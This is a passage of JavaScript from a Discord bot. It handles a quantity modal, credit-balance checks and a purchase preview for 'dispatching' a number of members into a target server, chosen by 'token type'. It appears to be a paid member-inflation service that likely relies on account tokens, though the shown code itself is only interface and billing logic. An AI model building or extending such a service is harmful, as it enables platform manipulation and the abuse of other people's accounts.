        } catch (e) { return interaction.reply({ content: '❌ **Pre-Flight Failed:** Bot is not in target server or Server ID is invalid.', ephemeral: true }); }
      }

      if (interaction.customId === 'modal_quantity') {
        const qty = parseInt(interaction.fields.getTextInputValue('input_quantity'), 10);
        const session = activeSessions.get(interaction.user.id);
        if (!session || isNaN(qty) || qty <= 0) return interaction.reply({ content: '❌ Invalid quantity specified.', ephemeral: true });
        let uc = await UserCredit.findOne({ discordId: interaction.user.id }) || { balance: 0 };
        if (qty > uc.balance) return interaction.reply({ content: `❌ Insufficient balance (${uc.balance.toLocaleString()} credits available).`, ephemeral: true });

        session.quantity = qty;
        const confirmEmbed = new EmbedBuilder().setColor(0x10b981)
          .setTitle('🛡️ CYBERPULSE OPERATION PRE-FLIGHT PREVIEW')
          .addFields(
            { name: '🏰 Target Infrastructure', value: `${session.guildName}\n\`${session.serverId}\``, inline: true },
            { name: '🔢 Dispatch Quantity', value: `${qty.toLocaleString()} Members`, inline: true },
            { name: '💳 Total Cost', value: `${qty.toLocaleString()} Credits`, inline: true },
            { name: '⚡ Security Audit', value: '`PASSED (Permissions Verified)`', inline: false }
          );
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('btn_confirm_purchase').setLabel('Confirm & Dispatch').setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId('btn_cancel_purchase').setLabel('Cancel').setStyle(ButtonStyle.Danger)
        );
        return interaction.reply({ embeds: [confirmEmbed], components: [row], ephemeral: true });
      }
    }

    if (interaction.isStringSelectMenu() && interaction.customId === 'select_token_type') {
      const modal = new ModalBuilder().setCustomId('modal_quantity').setTitle('Quantum Dispatch Quantity 🚀');
      const qtyInput = new TextInputBuilder().setCustomId('input_quantity').setLabel('Enter Quantity').setStyle(TextInputStyle.Short).setRequired(true);
      modal.addComponents(new ActionRowBuilder().addComponents(qtyInput));
      return await interaction.showModal(modal);
    }
  } catch (err) {}
});

client.login(TOKEN);
